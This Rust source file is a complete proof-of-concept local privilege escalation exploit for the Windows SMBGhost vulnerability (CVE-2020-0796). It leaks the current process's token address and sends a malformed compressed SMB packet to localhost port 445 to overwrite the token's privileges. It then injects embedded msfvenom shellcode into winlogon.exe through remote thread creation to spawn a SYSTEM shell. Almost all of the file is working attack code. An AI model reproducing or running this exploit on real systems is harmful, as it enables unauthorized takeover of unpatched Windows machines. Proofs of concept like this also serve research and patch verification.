/* 
CVE-2020-0796 (SMBGhost) LPE written by @0xeb_bp
based on writeup by ZecOps:
https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/
*/

use std::net::TcpStream;
use std::io::prelude::*;
use std::mem::size_of;
use std::ptr::null_mut;

use ntapi::ntexapi;
use ntapi::ntrtl;

use winapi::ctypes::c_void;
use winapi::um::psapi::{EnumProcesses, EnumProcessModules, GetModuleBaseNameA};
use winapi::um::{processthreadsapi, memoryapi, handleapi};
use winapi::um::winnt::*;
use winapi::shared::ntstatus::{STATUS_SUCCESS};
use winapi::shared::minwindef::{HMODULE, LPVOID};

#[derive(Debug)]
struct SMB2NegotiateReq {
    data: Vec<u8>,
}

impl SMB2NegotiateReq {
    fn new() -> SMB2NegotiateReq {
        let data = [ 
                0x00, 0x00, 0x00, 0xaa, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x00, 0x01, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x24, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x7f, 
                0x00, 0x00, 0x00, 0x66, 0x68, 0x6e, 0x71, 0x55, 0x76, 0x57, 0x66, 
                0x6e, 0x41, 0x6c, 0x4f, 0x6a, 0x78, 0x46, 0x4d, 0x68, 0x00, 0x00, 
                0x00, 0x02, 0x00, 0x00, 0x00, 0x11, 0x03, 0xff, 0xff, 0x01, 0x00, 
                0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x01,
                0x00, 0x70, 0x65, 0x6b, 0x78, 0x50, 0x67, 0x41, 0x46, 0x62, 0x77,
                0x51, 0x41, 0x4a, 0x7a, 0x70, 0x57, 0x69, 0x4f, 0x62, 0x65, 0x50, 
                0x69, 0x47, 0x67, 0x4e, 0x57, 0x51, 0x62, 0x79, 0x5a, 0x69, 0x52, 
                0xff, 0xff, 0x03, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
                0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00];

        let data: Vec<u8> = data.to_vec();
        SMB2NegotiateReq { data }
    }   
}

struct SMB2Compressed {
    data: Vec<u8>,
}

impl SMB2Compressed {
    fn new(pid_token_privs_address: usize) -> std::result::Result<SMB2Compressed, i32> {
        let cth = [
                    0xfc, 0x53, 0x4d, 0x42,    //ProtocolID
                    0xff, 0xff, 0xff, 0xff,    //OriginalCompressedSegmentSize
                    0x01, 0x00,                //CompressionAlgorithm (LZNT1)
                    0x00, 0x00                 //Flags
                  //0x00, 0x00, 0x00, 0x00     //Offset
                  ];

        let mut len: u32 = 0;
        let len_ptr = &mut len as *mut u32;

        let mut comp_buffer: [u8; 4096] = [0; 4096];
        //let mut uncomp_buffer: Vec<u8> = vec![0x42; 0x10f0];
        let mut uncomp_buffer: Vec<u8> = vec![0x42; 0x10e8];

        let fill: [u8; 0x18] = [0x00; 0x18];
        uncomp_buffer.extend_from_slice(&fill);

        // must be a better way to do this lol... 
        let pid_token_privs_address = pid_token_privs_address.to_be_bytes().to_vec();
        let pid_token_privs_address: Vec<u8> = pid_token_privs_address.into_iter().rev().collect();
        uncomp_buffer.extend_from_slice(&pid_token_privs_address[..]);

        //println!("[+] Target address: {:x?}", &pid_token_privs_address[..]);
        //println!("[+] UnCompressed Buffer: {:x?}", &uncomp_buffer[..]);

        let workspace_size = Box::into_raw(Box::<u32>::new(0));  
        let frag_size = Box::into_raw(Box::<u32>::new(0));  

        let res = unsafe { 
            ntrtl::RtlGetCompressionWorkSpaceSize(2, workspace_size, frag_size) 
        };
        if res != STATUS_SUCCESS {
            println!("[-] Error RtlGetCompressionWorkSpaceSize");
            return Err(1);
        }

        //println!("[+] Uncompressed Buffer Len: {}", uncomp_buffer.len());

        let workspace_size = unsafe { 
            *workspace_size as usize
        };

        //println!("[+] Workspace Size: {}", workspace_size); 
        let workspace: Vec<u8> = vec![0; workspace_size];

        let res = unsafe {
            ntrtl::RtlCompressBuffer(2, uncomp_buffer.as_mut_ptr(), uncomp_buffer.len() as u32, comp_buffer.as_mut_ptr(),
               comp_buffer.len() as u32, 4096, len_ptr, workspace.as_ptr() as *mut c_void)
        };

        if res != STATUS_SUCCESS {
            println!("[-] Error RtlGetCompressBuffer");
            return Err(1);
        }

        println!("[+] Compressed Data Length: {}", len);
        println!("[+] Compressed Data: {:x?}", &comp_buffer[..len as usize]);

        let offset = len.to_be_bytes().to_vec();
        let offset: Vec<u8> = offset.into_iter().rev().collect();

        // 0x1ff2ffffbc 
        let what: [u8; 0x18] = [
                                0xbc, 0xff, 0xff, 0xf2, 0x1f, 0x00, 0x00, 0x00,
                                0xbc, 0xff, 0xff, 0xf2, 0x1f, 0x00, 0x00, 0x00,
                                0xbc, 0xff, 0xff, 0xf2, 0x1f, 0x00, 0x00, 0x00,
                               ];
        let mut data: Vec<u8> = vec![];

        // compression transform header size (cth) 0x10 + (what) 0x18 + len of compressed = total packet size
        // probably a better way in rust to do this...
        data.extend_from_slice(&(0x28 + len).to_be_bytes()); //NetBIOS Session Service Header
        data.extend_from_slice(&cth[..]);
        data.extend_from_slice(&offset[..]);                  //Offset
        data.extend_from_slice(&what);                        //Full privs for token
        data.extend_from_slice(&comp_buffer[..len as usize]); //compressed buffer

        //println!("[+] Compressed Pkt: {:?}", &data[..]);

        Ok(SMB2Compressed { data })
    }
}

fn main() {
    println!("CVE-2020-0796 (SMBGhost) LPE written by @0xeb_bp\n");

    let sys_handle_info_ex_size = size_of::<ntexapi::SYSTEM_HANDLE_INFORMATION_EX>();
    //let sys_handle_entry_ex_size = size_of::<ntexapi::SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();

    //println!("+ Size of SYSTEM_HANDLE_INFORMATION_EX: {}", sys_handle_info_ex_size);
    //println!("+ Size of SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX: {}", sys_handle_entry_ex_size);
    //println!("+ Size of HMODULE: {}", size_of::<HMODULE>());

    let pid = unsafe { processthreadsapi::GetCurrentProcessId() as usize };
    let h_proc = unsafe { processthreadsapi::GetCurrentProcess() };
    let t_handle = Box::into_raw(Box::<usize>::new(0));

    let ret = unsafe { processthreadsapi::OpenProcessToken(h_proc, TOKEN_QUERY, t_handle as PHANDLE) };
    if ret == 0 {
        println!("[-] Error Getting Current PID Token");
        return;
    }

    println!("[+] Current Pid: {:?}", pid);
    //println!("[+] Token Handle: {}", *t_handle);

    let mut len: u32 = 0;
    let len_ptr = &mut len as *mut u32;

    let mut sys_handle_info_ex: Vec<u8> = vec![0; sys_handle_info_ex_size];

    let mut ret = unsafe { ntexapi::NtQuerySystemInformation(0x40, sys_handle_info_ex.as_ptr() as *mut c_void,
        sys_handle_info_ex_size as u32, len_ptr) };

    while ret != STATUS_SUCCESS {
        sys_handle_info_ex = vec![0; len as usize];

        ret = unsafe { ntexapi::NtQuerySystemInformation(0x40, sys_handle_info_ex.as_ptr() 
            as *mut c_void, len, len_ptr) };
    }

    let sys_handle_info_ex_ptr = sys_handle_info_ex.as_ptr() as ntexapi::PSYSTEM_HANDLE_INFORMATION_EX;
    let num_handles = unsafe { (*sys_handle_info_ex_ptr).NumberOfHandles as usize };

    /*
    SYSTEM_HANDLE_INFORMATION_EX
    Offset (x86)	Offset (x64)	Definition
    0x00	        0x00	        ULONG_PTR NumberOfHandles;
    0x04	        0x08            ULONG_PTR Reserved;
    0x08	        0x10        	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles [1];
    */

    let mut pid_eprocess: usize = 0;
    unsafe {
        let p = sys_handle_info_ex.as_ptr().offset(0x10);
        for handle in 0..num_handles {
            let offset = handle * 40;
            let z = p.offset(offset as isize) as ntexapi::PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
            if (*z).UniqueProcessId == pid {
                if (*z).HandleValue == *t_handle {
                    pid_eprocess = (*z).Object as usize;
                    println!("[+] Current PID Token Address: {:x}", pid_eprocess as usize);
                    break;
                }
            }
        }
    }

    let pid_token_privs_address = pid_eprocess+0x40;
    println!("[+] Current PID Token Privilege Address: {:x}", pid_token_privs_address);

    println!("[+] Crafting Malformed Compression Packet");
    let negotiate_req = SMB2NegotiateReq::new();
    let compressed = SMB2Compressed::new(pid_token_privs_address).unwrap();
    
    let mut stream = TcpStream::connect("127.0.0.1:445").unwrap();

    println!("[+] Sending SMB Negotiate/Malformed Compressed Packet");
    stream.write(&negotiate_req.data[..]).unwrap();
    stream.read(&mut [0; 128]).unwrap();
    stream.write(&compressed.data[..]).unwrap();

    println!("[+] Searching for winlogon.exe PID");
    let mut processes: [u32; 4096] = [0; 4096];
    let ret = unsafe { EnumProcesses(processes.as_mut_ptr(), 4096, len_ptr) };       
    if ret == 0 {
        println!("[-] Error EnumProcesses");
        return;
    }

    let num_processes = len/4;

    let target_p = String::from("winlogon.exe");
    let mut winlogon_pid = 0;

    for process in 0..num_processes {
        let tpid = processes[process as usize];
        let hprocess = unsafe { processthreadsapi::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, tpid) };

        if hprocess as usize != 0 {
            let hmodule = Box::into_raw(Box::<usize>::new(0));

            let ret = unsafe {EnumProcessModules(hprocess, hmodule as *mut HMODULE, 8, len_ptr) };
            if  ret != 0 {
                let mut pname: [i8; 1024] = [0; 1024];

                unsafe { GetModuleBaseNameA(hprocess, *hmodule as HMODULE, pname.as_mut_ptr(), 1024) };

                let found = String::from_utf8(pname.iter().map(|&c| c as u8).collect()).unwrap();
                let found = found.trim_matches(char::from(0));

                unsafe { handleapi::CloseHandle(hprocess) };

                if found == target_p {
                    println!("[+] Found winlogin.exe pid: {}", tpid);    
                    winlogon_pid = tpid;
                    break;
                }
            }   
        }
    }

    if winlogon_pid == 0 {
        println!("[-] Error finding winlogin.exe pid");
        return;
    }

    println!("[+] Injecting into winlogon.exe");
    //OpenProcess
    let hprocess = unsafe { processthreadsapi::OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid) };
    if hprocess as usize == 0 {
        println!("[-] Error OpenProcess winlogin.exe");
        return;
    }

    //VirtualAllocEx
    let hmem = unsafe { memoryapi::VirtualAllocEx(hprocess, null_mut(), 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    if hmem as usize == 0 {
        println!("[-] Error VirtualAllocEx");
        return;
    }

    // msfvenom shellcode
    // msfvenom -p windows/x64/exec CMD=cmd exitfunc=thread -b "\x00"
    let shellcode = [
        0x48u8,0x31,0xc9,0x48,0x81,0xe9,0xde,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
        0xff,0xff,0x48,0xbb,0xd9,0x13,0x74,0x30,0x61,0x6e,0x0c,0x7b,0x48,0x31,0x58,
        0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x25,0x5b,0xf7,0xd4,0x91,0x86,
        0xcc,0x7b,0xd9,0x13,0x35,0x61,0x20,0x3e,0x5e,0x2a,0x8f,0x5b,0x45,0xe2,0x04,
        0x26,0x87,0x29,0xb9,0x5b,0xff,0x62,0x79,0x26,0x87,0x29,0xf9,0x5b,0xff,0x42,
        0x31,0x26,0x03,0xcc,0x93,0x59,0x39,0x01,0xa8,0x26,0x3d,0xbb,0x75,0x2f,0x15,
        0x4c,0x63,0x42,0x2c,0x3a,0x18,0xda,0x79,0x71,0x60,0xaf,0xee,0x96,0x8b,0x52,
        0x25,0x78,0xea,0x3c,0x2c,0xf0,0x9b,0x2f,0x3c,0x31,0xb1,0xe5,0x8c,0xf3,0xd9,
        0x13,0x74,0x78,0xe4,0xae,0x78,0x1c,0x91,0x12,0xa4,0x60,0xea,0x26,0x14,0x3f,
        0x52,0x53,0x54,0x79,0x60,0xbe,0xef,0x2d,0x91,0xec,0xbd,0x71,0xea,0x5a,0x84,
        0x33,0xd8,0xc5,0x39,0x01,0xa8,0x26,0x3d,0xbb,0x75,0x52,0xb5,0xf9,0x6c,0x2f,
        0x0d,0xba,0xe1,0xf3,0x01,0xc1,0x2d,0x6d,0x40,0x5f,0xd1,0x56,0x4d,0xe1,0x14,
        0xb6,0x54,0x3f,0x52,0x53,0x50,0x79,0x60,0xbe,0x6a,0x3a,0x52,0x1f,0x3c,0x74,
        0xea,0x2e,0x10,0x32,0xd8,0xc3,0x35,0xbb,0x65,0xe6,0x44,0x7a,0x09,0x52,0x2c,
        0x71,0x39,0x30,0x55,0x21,0x98,0x4b,0x35,0x69,0x20,0x34,0x44,0xf8,0x35,0x33,
        0x35,0x62,0x9e,0x8e,0x54,0x3a,0x80,0x49,0x3c,0xbb,0x73,0x87,0x5b,0x84,0x26,
        0xec,0x29,0x78,0xdb,0x6f,0x0c,0x7b,0xd9,0x13,0x74,0x30,0x61,0x26,0x81,0xf6,
        0xd8,0x12,0x74,0x30,0x20,0xd4,0x3d,0xf0,0xb6,0x94,0x8b,0xe5,0xda,0x8e,0x11,
        0x51,0xd3,0x52,0xce,0x96,0xf4,0xd3,0x91,0x84,0x0c,0x5b,0xf7,0xf4,0x49,0x52,
        0x0a,0x07,0xd3,0x93,0x8f,0xd0,0x14,0x6b,0xb7,0x3c,0xca,0x61,0x1b,0x5a,0x61,
        0x37,0x4d,0xf2,0x03,0xec,0xa1,0x53,0x0c,0x0a,0x0c,0x7b];

    //WriteProcessMemory
    let ret = unsafe { memoryapi::WriteProcessMemory(hprocess, hmem, shellcode.as_ptr() as *const c_void, shellcode.len(), 
                            null_mut()) };
    if ret == 0 {
        println!("[-] Error WriteProcessMemory");
        return;
    }

    println!("[+] Spawning shell...");
    //CreateRemoteThread
    let f = unsafe { Some(*(&hmem as *const _ as *const unsafe extern "system" fn(LPVOID) -> u32)) };
    let ret = unsafe { processthreadsapi::CreateRemoteThread(hprocess, null_mut(), 0, f, null_mut(), 0, null_mut()) };
    if ret as usize == 0 {
        println!("Error CreateRemoteThread");
        return;
    }
}